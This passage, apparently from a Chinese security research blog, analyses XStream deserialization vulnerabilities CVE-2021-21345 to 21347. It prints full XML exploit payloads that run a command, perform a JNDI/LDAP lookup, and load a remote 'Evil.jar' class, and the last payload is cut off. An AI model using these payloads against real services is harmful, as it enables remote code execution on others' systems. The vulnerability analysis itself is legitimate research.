style="zoom:50%;"><p>可以看到invoke到<code>com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData</code>中，并最终在JdbcRowSetImpl的connect方法中通过JNDI去lookup事先封装在JdbcRowSetImpl的dataSource中的恶意地址：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210804183420058.png" alt="image-20210804183420058" style="zoom:50%;"><p>其实整个链的关键点是这里的get方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210804182242246.png" alt="image-20210804182242246" style="zoom:50%;"><p>XStream不受Serializable接口限制，所有类都可以实例化，导致链过程中的很多节点都可以参与序列化。</p><h1 id="CVE-2021-21345"><a href="#CVE-2021-21345" class="headerlink" title="CVE_2021_21345"></a>CVE_2021_21345</h1><p>XStream：1.4.15</p><h2 id="漏洞成因-4"><a href="#漏洞成因-4" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>和21344长得很像，出发点是一样的PriorityQueue，RCE触发点是com.sun.corba.se.impl.activation.ServerTableEntry</p><p>唯一的不同点在于：</p><p>21344使用JdbcRowSetImpl去远程加载恶意类来到本地执行恶意代码；</p><p>21345使用<code>com.sun.corba.se.impl.activation.ServerTableEntry</code>类直接在本地执行恶意代码</p><h2 id="PoC-4"><a href="#PoC-4" class="headerlink" title="PoC"></a>PoC</h2><p>来自官网：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">'custom'</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">'sun.awt.datatransfer.DataTransferer$IndexOrderComparator'</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.client.ResponseContext'</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.message.JAXBAttachment'</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.bind.v2.runtime.BridgeImpl'</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>verify<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">'../..'</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">'com.sun.corba.se.impl.activation.ServerTableEntry'</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">activationCmd</span>&gt;</span>open /Applications/Calculator.app<span class="tag">&lt;/<span class="name">activationCmd</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><p>调试：</p><p>前半部分还是一样，一样是到了get方法去invoke，invoke的目标方法就是</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210806193915558.png" alt="image-20210806193915558" style="zoom:50%;"><p>我们直接去<code>com.sun.corba.se.impl.activation.ServerTableEntry</code>的<code>verify</code>方法打上断点好了，跟到verify：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210806195221879.png" alt="image-20210806195221879" style="zoom:50%;"><p>直接触发了<code>Runtime.getRuntime().exec(&quot;open /Applications/Calculator.app&quot;);</code></p><h1 id="CVE-2021-21346"><a href="#CVE-2021-21346" class="headerlink" title="CVE_2021_21346"></a>CVE_2021_21346</h1><p>XStream：1.4.15</p><h2 id="漏洞成因-5"><a href="#漏洞成因-5" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>师兄wh1t3p1g提交的，利用的是ldap恶意reference</p><h2 id="PoC-5"><a href="#PoC-5" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">'javax.swing.MultiUIDefaults'</span> <span class="attr">serialization</span>=<span class="string">'custom'</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">hashtable</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">loadFactor</span>&gt;</span>0.75<span class="tag">&lt;/<span class="name">loadFactor</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">threshold</span>&gt;</span>525<span class="tag">&lt;/<span class="name">threshold</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>700<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">hashtable</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">defaultLocale</span>&gt;</span>zh_CN<span class="tag">&lt;/<span class="name">defaultLocale</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">resourceCache</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">javax.swing.MultiUIDefaults</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tables</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span> <span class="attr">serialization</span>=<span class="string">'custom'</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">hashtable</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">loadFactor</span>&gt;</span>0.75<span class="tag">&lt;/<span class="name">loadFactor</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">threshold</span>&gt;</span>525<span class="tag">&lt;/<span class="name">threshold</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>700<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>lazyValue<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">sun.swing.SwingLazyValue</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">className</span>&gt;</span>javax.naming.InitialContext<span class="tag">&lt;/<span class="name">className</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>doLookup<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">args</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>ldap://localhost:1099/CallRemoteMethod<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">args</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">sun.swing.SwingLazyValue</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">hashtable</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">defaultLocale</span> <span class="attr">reference</span>=<span class="string">'../../../../../../../javax.swing.UIDefaults/default/defaultLocale'</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">resourceCache</span>/&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">tables</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">javax.swing.MultiUIDefaults</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.xpath.internal.objects.XString'</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">'string'</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><p>调试：</p><p>利用的是<code>LazyValue</code></p><p>关键调用链：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">javax.naming.ldap.Rdn$RdnEntry.compareTo</span><br><span class="line">    com.sun.org.apache.xpath.internal.objects.XString.equals</span><br><span class="line">        javax.swing.MultiUIDefaults.toString</span><br><span class="line">            UIDefaults.get</span><br><span class="line">                UIDefaults.getFromHashTable</span><br><span class="line">                    UIDefaults$LazyValue.createValue</span><br><span class="line">                    SwingLazyValue.createValue</span><br><span class="line">                        javax.naming.InitialContext.doLookup()</span><br></pre></td></tr></table></figure><p>在<code>createValue</code>里面出现了invoke，也是一个关键的节点，invoke了构造好的<code>javax.naming.InitialContext.doLookup()</code>方法</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210806200548285.png" alt="image-20210806200548285" style="zoom:50%;"><p><code>doLookUp</code>对恶意类的reference进行了调用，漏洞触发。</p><h1 id="CVE-2021-21347"><a href="#CVE-2021-21347" class="headerlink" title="CVE_2021_21347"></a>CVE_2021_21347</h1><p>XStream：1.4.15 </p><p>jdk: 8u231</p><h2 id="漏洞成因-6"><a href="#漏洞成因-6" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>远程类加载，类实例化执行静态代码块</p><h2 id="PoC-6"><a href="#PoC-6" class="headerlink" title="PoC"></a>PoC</h2><p>来自官网：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">'custom'</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">'javafx.collections.ObservableList$1'</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">'java.io.SequenceInputStream'</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">'javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">'com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">names</span> <span class="attr">class</span>=<span class="string">'java.util.AbstractList$Itr'</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>0<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">class</span>=<span class="string">'java.util.Arrays$ArrayList'</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">'string-array'</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">string</span>&gt;</span>Evil<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">processorCL</span> <span class="attr">class</span>=<span class="string">'java.net.URLClassLoader'</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">ucp</span> <span class="attr">class</span>=<span class="string">'sun.misc.URLClassPath'</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">urls</span> <span class="attr">serialization</span>=<span class="string">'custom'</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">vector</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">capacityIncrement</span>&gt;</span>0<span class="tag">&lt;/<span class="name">capacityIncrement</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">elementCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">elementCount</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">elementData</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://127.0.0.1:8000/Evil.jar<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;/<span class="name">elementData</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">vector</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">urls</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://127.0.0.1:8000/Evil.jar<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">loaders</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lmap</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">ucp</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">'concurrent-hash-map'</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">classes</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classloader</span> <span class="attr">class</span>=<span class="string">'java.net.URLClassLoader'</span> <span class="attr">reference</span>=<span class="string">'../..'</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">'../..'</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>true<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">pdcache</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">processorCL</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span 